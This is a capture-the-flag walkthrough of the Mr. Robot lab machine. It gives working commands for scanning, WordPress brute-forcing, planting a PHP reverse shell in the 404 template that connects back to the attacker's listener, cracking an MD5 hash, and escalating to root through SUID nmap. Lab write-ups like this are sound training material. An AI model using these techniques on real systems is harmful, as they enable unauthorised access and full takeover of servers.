Mr. Robot CTF — Complete Penetration Testing Walkthrough
📋 Table of Contents
CTF Information

Tools Used

Phase 1: Reconnaissance

Phase 2: Flag 1 Discovery

Phase 3: Web Enumeration

Phase 4: WordPress Exploitation

Phase 5: Reverse Shell

Phase 6: Flag 2 Discovery

Phase 7: Privilege Escalation

Phase 8: Flag 3 Discovery

Attack Timeline

Lessons Learned

Mitigation Recommendations

📌 CTF Information
Category	Details
Platform	TryHackMe / VulnHub
Room Name	Mr. Robot
Difficulty	Medium
Theme	Inspired by the TV show "Mr. Robot"
Goal	Capture 3 flags
Flag Format	MD5 hashes
Target IP	10.10.x.x (varies per instance)
🛠️ Tools Used
Tool	Purpose
nmap	Port and service discovery
gobuster / dirb	Directory brute-forcing
curl	Web requests
wget	File downloads
base64	Decoding credentials
john / hashcat	Password cracking
WPScan	WordPress vulnerability scanner
hydra	Brute-force attacks
nc (netcat)	Reverse shell listener
python	Shell upgrade
🔍 PHASE 1: RECONNAISSANCE
1.1 Network Scanning
Command:

bash
nmap -p- --open -sS -Pn --min-rate 5000 -v -n 10.10.x.x
Results:

text
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
Detailed Scan:

bash
nmap -sV -sC -p 22,80,443 10.10.x.x -oN nmap_scan.txt
Findings:

Port 80 → Apache HTTP Server

Port 443 → Apache HTTPS Server

Port 22 → OpenSSH (potential later access)

🚩 PHASE 2: FLAG 1 DISCOVERY
2.1 Robots.txt Analysis
bash
curl http://10.10.x.x/robots.txt
Response:

text
User-agent: *
fsocity.dic
key-1-of-3.txt
2.2 Download Flag 1
bash
wget http://10.10.x.x/key-1-of-3.txt
cat key-1-of-3.txt
✅ FLAG 1:

text
073403c8a58a1f80d943455fb30724b9
(Example hash — your instance will differ)

2.3 Download Wordlist
bash
wget http://10.10.x.x/fsocity.dic
wc -l fsocity.dic
Output: 858160 fsocity.dic — over 858,000 potential passwords

📂 PHASE 3: WEB ENUMERATION
3.1 Directory Brute-Forcing
bash
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirb/common.txt -t 50
Discovered Directories:

text
/wp-admin
/wp-content
/wp-includes
/wp-login.php
/robots
/license
/readme
3.2 License Page Analysis
bash
curl http://10.10.x.x/license
Bottom of page reveals base64 string:

text
ZWxsaW90OkVSMjgtMDY1Mgo=
3.3 Decode Credentials
bash
echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
Output:

text
elliot:ER28-0652
🎉 Credentials Obtained:

Username: elliot

Password: ER28-0652

🔓 PHASE 4: WORDPRESS EXPLOITATION
4.1 WordPress Login
Navigate to:

text
http://10.10.x.x/wp-login.php
Login with: elliot / ER28-0652

Status: ✅ Success — logged in as Administrator

4.2 User Enumeration (Alternative Method)
bash
wpscan --url http://10.10.x.x --enumerate u
Result: Valid username elliot confirmed

4.3 Password Brute-Force (If Needed)
Deduplicate wordlist:

bash
sort fsocity.dic | uniq > fsocity-sorted.dic
Brute-force with WPScan:

bash
wpscan --url http://10.10.x.x --usernames elliot --passwords fsocity-sorted.dic
💀 PHASE 5: REVERSE SHELL
5.1 Prepare Payload
bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
nano php-reverse-shell.php
Modify these lines:

php
$ip = 'YOUR_KALI_IP';     // Your attacker IP
$port = 4444;              // Listening port
5.2 Upload via WordPress Theme Editor
Appearance → Theme Editor

Select 404 Template (404.php)

Replace content with reverse shell code

Click Update File

5.3 Start Listener
bash
nc -lvnp 4444
5.4 Trigger Shell
bash
curl http://10.10.x.x/wp-content/themes/twentyfifteen/404.php
OR browse to any non-existent page:

text
http://10.10.x.x/random-nonexistent-page
5.5 Shell Obtained!
bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.x.x.x] from (UNKNOWN) [10.x.x.x] 54321
daemon@linux:/$
🔧 PHASE 6: SHELL UPGRADE
6.1 Stabilize Shell
bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z
stty raw -echo; fg
# Press Enter twice
Now you have a fully interactive shell!

🚩 PHASE 7: FLAG 2 DISCOVERY
7.1 Explore Home Directories
bash
ls -la /home
Output:

text
drwxr-xr-x  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
drwxr-xr-x  2 root root 4096 Nov 13  2015 robot
7.2 Check Robot's Directory
bash
ls -la /home/robot
Output:

text
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
7.3 Read Password Hash
bash
cat /home/robot/password.raw-md5
Output:

text
robot:c3fcd3d76192e4007dfb496cca67e13b
7.4 Crack MD5 Hash
bash
echo "c3fcd3d76192e4007dfb496cca67e13b" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
OR use CrackStation (online):

Cracked Password: abcdefghijklmnopqrstuvwxyz

7.5 Switch to Robot User
bash
su robot
Password: abcdefghijklmnopqrstuvwxyz
7.6 Read Flag 2
bash
cat /home/robot/key-2-of-3.txt
✅ FLAG 2:

text
fc62c281e015098330a372ad7b98f836
(Example hash — your instance will differ)

👑 PHASE 8: PRIVILEGE ESCALATION
8.1 Find SUID Binaries
bash
find / -perm -4000 -type f 2>/dev/null
Key Finding:

text
/usr/local/bin/nmap
8.2 Check Nmap Permissions
bash
ls -la /usr/local/bin/nmap
-rwsr-xr-x 1 root root 4489480 Nov 13  2015 /usr/local/bin/nmap
Note: The s in rws indicates SUID — nmap runs as root!

8.3 Exploit Nmap Interactive Mode
bash
/usr/local/bin/nmap --interactive
In Nmap interactive shell:

text
nmap> !sh
8.4 Verify Root Access
bash
whoami
root
8.5 Alternative Exploit Method (If Interactive Mode Unavailable)
bash
echo 'os.execute("/bin/sh")' > shell.nse
nmap --script=shell.nse
🚩 PHASE 9: FLAG 3 DISCOVERY
9.1 Navigate to Root Directory
bash
cd /root
ls -la
9.2 Read Flag 3
bash
cat /root/key-3-of-3.txt
✅ FLAG 3:

text
0474afefec71efedf5410ec47d9acf1e
(Example hash — your instance will differ)

9.3 Mission Complete 🎉
text
Three flags obtained. System compromised.
📊 Attack Timeline
Phase	Time	Action
1	00:05	Nmap scan — discovered ports 22, 80, 443
2	00:10	Found robots.txt → discovered Flag 1 and wordlist
3	00:15	Directory enumeration → found /license page
4	00:20	Decoded base64 credentials → elliot:ER28-0652
5	00:25	WordPress login successful
6	00:30	Uploaded reverse shell via 404.php
7	00:35	Obtained shell as daemon
8	00:40	Upgraded to full TTY
9	00:45	Found Flag 2 in /home/robot
10	00:50	Cracked robot's MD5 password
11	00:55	Switched to robot user
12	01:00	Found SUID nmap
13	01:05	Escalated to root via nmap --interactive
14	01:10	Captured Flag 3 from /root
Total Time: ~70 minutes

